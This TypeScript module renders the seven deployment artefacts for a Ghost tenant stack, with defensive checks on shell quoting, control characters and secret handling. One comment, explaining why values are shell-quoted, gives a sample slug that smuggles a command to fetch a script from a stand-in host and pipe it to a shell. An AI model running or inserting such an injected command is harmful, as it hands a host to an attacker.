/**
 * The descriptor-to-artefacts step LLD-2 §03 calls "render" — pure and
 * total: same seven artefacts, from the same functions, for every kind and
 * both reconcilers (LLD-1 §02, "the pure core, unchanged in both, extended
 * in §04"). `render()` performs no I/O — see `test/render.test.ts`'s own
 * no-I/O assertion, and `test/dependency-closure.test.ts`, which already
 * refuses any import of a Node built-in (`node:fs`, `node:http`, …) as a
 * bare specifier leaving the package, so an I/O call could not be added
 * here without failing that test first. (That is also why this module
 * implements its own tiny `dirname` below rather than importing
 * `node:path`.)
 *
 * **No secret ever appears in an artefact.** `render()`'s own parameter is
 * a `TenantDescriptor`, which carries no secret field to begin with — the
 * schema's only credential-shaped values (`gate.argon2idHash`,
 * `backup.encryptionRecipient`) are not secrets by the estate's own
 * definition (a hash and a public age recipient) — so every place a real
 * secret belongs is rendered as a `${VAR:?…}` reference into a file this
 * package never touches (`environment.ts`) or as a blank key name in a
 * template an operator fills in by hand (`secrets.env` below, from
 * `renderSecretsTemplate`).
 *
 * **The seven artefacts, mapped from LLD-1 §04's diagram:**
 *
 * 1. `compose.yml` — `compose.ts`
 * 2. `secrets.env` — the *names* this kind needs in
 *    `/etc/branchleft/<slug>.env`, never their values (LLD-1's `<slug>.env`
 *    box)
 * 3. `image.env` — the digest-pinned image reference (LLD-1's
 *    `<slug>.image.env` box; today rendered by `branchleft-deploy`, not by
 *    this component — folded in here because nothing about the value is
 *    secret and a reconciler that already writes six artefacts should not
 *    have to special-case the seventh out of band)
 * 4. `provision.sh` — the host commands LLD-1's diagram shows as a fourth
 *    box beside the three file artefacts above (volume creation for a
 *    paying tenant; informational only for a demo — see
 *    `renderProvisionScript`)
 * 5. `edge.json` — `edge.ts`, **new**
 * 6. `ghost-settings.json` — `settings.ts`, **new**
 * 7. `identity.json` — `identity.ts`, **new**
 *
 * **Known Done-criterion conflict, not resolved here — see the PR body.**
 * The story's own Done means says tenant zero's rendered Compose and
 * environment are byte-identical to what `infra/tenant` renders today.
 * `compose.ts`'s own doc comment explains why that cannot hold at the same
 * time as LLD-1 §03b's ruling that blue/green applies "everywhere, demos
 * included": today's renderer emits one service on one port; this one
 * necessarily emits two. The environment *values* this module renders
 * match for every key `TransportSpec` can carry; `environment.ts`'s own
 * doc comment on `transportEnvironment` names the four keys it cannot yet,
 * and why.
 */

import {
  validateDigestPinnedRef,
  validatePort,
  validatePrivateIpV4,
  validateSlug,
  validateTenantUid,
} from './brand.js';
import { renderComposeStack, type DemoDataMount } from './compose.js';
import type { TenantDescriptor } from './descriptor.js';
import { renderEdgeSiteBlock } from './edge.js';
import { tenantEnvironment, SECRET_ENV_KEYS } from './environment.js';
import { renderIdentity } from './identity.js';
import { imageEnvPath, secretsEnvPath, stackName, validateSlugAvailability } from './naming.js';
import { uploadLimits } from './runtime.js';
import { renderSettings } from './settings.js';
import type { ZoneConfig } from './validate.js';
import { FieldValidationError } from './brand.js';

/** One file a caller writes into a slot's (or a tenant's) own directory —
 * matches `services/broker/src/render.ts`'s `Artefact` shape structurally,
 * without this package importing it (the dependency-closure rule runs the
 * other way: consumers depend on `render-core`, never the reverse). */
export interface Artefact {
  readonly path: string;
  readonly content: string;
  /** Octal file mode; a consumer that omits it defaults to owner-only. */
  readonly mode?: number;
}

const SECRETS_ENV_MODE = 0o600;
const REQUIRED_SECRET_KEYS: Record<'sqlite' | 'mysql', readonly string[]> = {
  sqlite: [],
  mysql: [SECRET_ENV_KEYS.databasePassword],
};

function requiredSecretKeys(descriptor: TenantDescriptor): string[] {
  const keys: string[] = [...REQUIRED_SECRET_KEYS[descriptor.database.kind]];
  if (descriptor.media.kind === 's3') {
    keys.push(SECRET_ENV_KEYS.s3AccessKeyId, SECRET_ENV_KEYS.s3SecretAccessKey);
  }
  if (descriptor.transport.kind === 'smtp') {
    keys.push(SECRET_ENV_KEYS.mailPassword);
  }
  return keys;
}

/**
 * A template naming which secrets this descriptor's kind needs, never their
 * values — `render()` has no secret to put here even if it wanted to (see
 * the module doc comment). A demo (`sqlite` + `local`) needs none, so its
 * template carries only the header comment.
 */
export function renderSecretsTemplate(descriptor: TenantDescriptor): string {
  const path = secretsEnvPath(descriptor.slug);
  const keys = requiredSecretKeys(descriptor);
  const lines = [
    `# Secrets for the ${descriptor.slug} Ghost stack, at ${path}.`,
    '# Root-owned, mode 0600. Written by an operator; no automated path may',
    '# rewrite this file. render() names the keys this tenant needs below —',
    '# it never has a value to put here.',
  ];
  if (keys.length === 0) {
    lines.push('# This tenant needs no secret: sqlite + local media + queue transport.');
  } else {
    for (const key of keys) {
      lines.push(`${key}=`);
    }
  }
  return `${lines.join('\n')}\n`;
}

// eslint-disable-next-line no-control-regex -- refusing control characters is the point
const CONTROL_CHARACTER = /[\u0000-\u001f\u007f-\u009f]/;

/**
 * `validateDigestPinnedRef`'s own pattern is anchored `^…$`, but JavaScript's
 * `$` (without the `m` flag) matches immediately before one *trailing*
 * newline as well as end-of-string — so `"<ref>\n"` passes it. A second,
 * explicit control-character refusal here is what closes that: a newline
 * in `IMAGE=<value>` would otherwise start a second `EnvironmentFile`
 * variable systemd reads as if this tenant had declared it.
 */
function renderImageEnv(descriptor: TenantDescriptor): string {
  if (CONTROL_CHARACTER.test(descriptor.image)) {
    throw new FieldValidationError(
      'image',
      'image must not contain a control character — a trailing newline would start a second ' +
        'EnvironmentFile variable.'
    );
  }
  return `IMAGE=${descriptor.image}\n`;
}

// POSIX single-quote escaping: closes the quote, emits an escaped literal
// quote, reopens it. Every value interpolated into provision.sh goes
// through this: an unquoted slug such as `demo-1; curl evil.example | sh #`
// would otherwise reach the script's argv as shell syntax rather than as
// one argument.
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

/**
 * The exact root-run command that must create a paying tenant's two named
 * volumes, owned to its uid, before its unit can start — ported from
 * `infra/tenant/index.ts`'s `hostProvisioningCommand`, at the path
 * `RUNBOOK-tenant-onboarding.md` actually invokes it from (a bare command
 * name would fail "command not found" as a standalone script).
 *
 * A demo renders no equivalent command: its one directory is host-
 * provisioned once, at demo-host build time (LLD-2 §01, not yet built) —
 * never per recycle, and never keyed by `slug` (a demo's slug is a
 * throwaway per-lease value). `provision.sh` still exists for a demo, per
 * the story's own Done means ("all seven artefacts... for a demo"), but is
 * informational rather than a command to run.
 */
function renderProvisionScript(descriptor: TenantDescriptor): string {
  const lines = ['#!/bin/sh', 'set -eu'];
  if (descriptor.kind === 'demo') {
    lines.push(
      `# ${descriptor.slug}'s slot data directory is host-provisioned once, at demo-host`,
      '# build time (LLD-2 §01) -- there is nothing for this script to do per recycle.'
    );
  } else {
    lines.push(
      `# Provisions ${descriptor.slug}'s two named volumes before ${stackName(descriptor.slug)}'s`,
      '# unit is enabled. Idempotent; safe to re-run.',
      `/root/platform-provision/provision_tenant_volume.py --uid ${shellQuote(String(descriptor.uid))} ${shellQuote(descriptor.slug)}`
    );
  }
  return `${lines.join('\n')}\n`;
}

function renderJson(value: unknown): string {
  return `${JSON.stringify(value, null, 2)}\n`;
}

// A pure, dependency-closure-safe stand-in for `node:path`'s `dirname` —
// POSIX-only (every path this package renders is a container path), and
// deliberately narrow: it is never handed a path without at least one `/`,
// because `assertDemoDataPaths` below checks that first.
function dirname(path: string): string {
  const lastSlash = path.lastIndexOf('/');
  return lastSlash <= 0 ? '/' : path.slice(0, lastSlash);
}

/**
 * The demo data mount `compose.ts` needs: both `database.path` (the SQLite
 * file) and `media.path` (the local media directory) must resolve under
 * one common parent, because a demo gets exactly one host-provisioned
 * directory (LLD-2 §01, load-bearing: "one directory") to mount there —
 * not one volume per path. Named by `uid` (the stable per-slot identity),
 * never `slug` — see `compose.ts`'s own `DemoDataMount` doc comment.
 */
function demoDataMount(descriptor: TenantDescriptor): DemoDataMount | null {
  if (descriptor.database.kind !== 'sqlite' || descriptor.media.kind !== 'local') {
    return null;
  }
  const dataDir = dirname(descriptor.database.path);
  if (descriptor.media.path !== dataDir && !descriptor.media.path.startsWith(`${dataDir}/`)) {
    throw new FieldValidationError(
      'media.path',
      `media.path "${descriptor.media.path}" must be database.path's own parent directory ` +
        `("${dataDir}") or a subdirectory of it — a demo mounts one host-provisioned directory ` +
        `for both, per LLD-2 §01's "one directory".`
    );
  }
  return { volumeName: `ghost-demo-${descriptor.uid}-data`, path: dataDir };
}

/**
 * Re-checks the fields the broker's own reconcile handler already guards
 * before calling a `Renderer` (`slotAllocation` — LLD-2 §01, load-bearing:
 * "no port to pick, no uid to compute"), plus the two fields
 * `renderProvisionScript`/`renderImageEnv` interpolate into shell and env
 * file text (`slug`, `image`) — so this function is safe to call directly,
 * outside that handler, by a caller with no `validate()` of its own (a
 * test, a descriptor rendered for review). Allocating the *right* uid/port
 * for a given slot is still the caller's job, not this one's; see
 * `compose.ts`'s own comment on why the descriptor's own fields are the
 * only source `render()` ever reads a uid or a port from.
 */
function assertAllocationShape(descriptor: TenantDescriptor): void {
  validateTenantUid(descriptor.uid);
  validatePort(descriptor.ports.a, 'ports.a');
  validatePort(descriptor.ports.b, 'ports.b');
  validatePort(descriptor.ports.health, 'ports.health');
  validatePrivateIpV4(descriptor.appHostIp);
  validateSlug(descriptor.slug);
  validateSlugAvailability(descriptor.slug);
  validateDigestPinnedRef(descriptor.image);
}

/**
 * `descriptor` must already have passed `validate()` — `render()` does not
 * re-run it (that would make every call two passes over the same
 * cross-field rules) but does re-check every field it interpolates into
 * shell, env or Compose text directly, via `assertAllocationShape`, so a
 * caller that skipped `validate()` gets a named refusal here rather than a
 * malformed artefact.
 *
 * Returns the seven artefacts directly — the shape `services/broker/src/
 * render.ts`'s `Renderer.render()` seam expects, and what the story's own
 * Done means names: "`render(descriptor)` returns all seven artefacts".
 * `renderEdgeSiteBlock`/`renderSettings`/`renderIdentity` stay separately
 * exported for a caller (a test, a future reconciler) that wants one
 * artefact's typed value rather than re-parsing it back out of `content`.
 */
export function render(descriptor: TenantDescriptor, zones: ZoneConfig): readonly Artefact[] {
  assertAllocationShape(descriptor);
  const dataMount = demoDataMount(descriptor);

  const limits = uploadLimits();
  const environment = tenantEnvironment(descriptor, limits, secretsEnvPath(descriptor.slug));
  const compose = renderComposeStack({
    kind: descriptor.kind,
    slug: descriptor.slug,
    uid: descriptor.uid,
    appHostPrivateIp: descriptor.appHostIp,
    ports: descriptor.ports,
    environment,
    limits,
    caps: descriptor.caps,
    dataMount,
  });
  const edge = renderEdgeSiteBlock(descriptor, zones, limits);
  const settings = renderSettings(descriptor);
  const identity = renderIdentity(descriptor);

  return [
    { path: 'compose.yml', content: compose, mode: 0o644 },
    { path: 'secrets.env', content: renderSecretsTemplate(descriptor), mode: SECRETS_ENV_MODE },
    { path: 'image.env', content: renderImageEnv(descriptor), mode: 0o644 },
    { path: 'provision.sh', content: renderProvisionScript(descriptor), mode: 0o700 },
    { path: 'edge.json', content: renderJson(edge), mode: 0o644 },
    { path: 'ghost-settings.json', content: renderJson(settings), mode: 0o644 },
    { path: 'identity.json', content: renderJson(identity), mode: 0o644 },
  ];
}

export { imageEnvPath, renderEdgeSiteBlock, renderSettings, renderIdentity };
export type { EdgeGate, EdgeSiteBlock } from './edge.js';
export type { GhostSettings, CodeInjectionSettings } from './settings.js';
export type { TenantIdentity } from './identity.js';
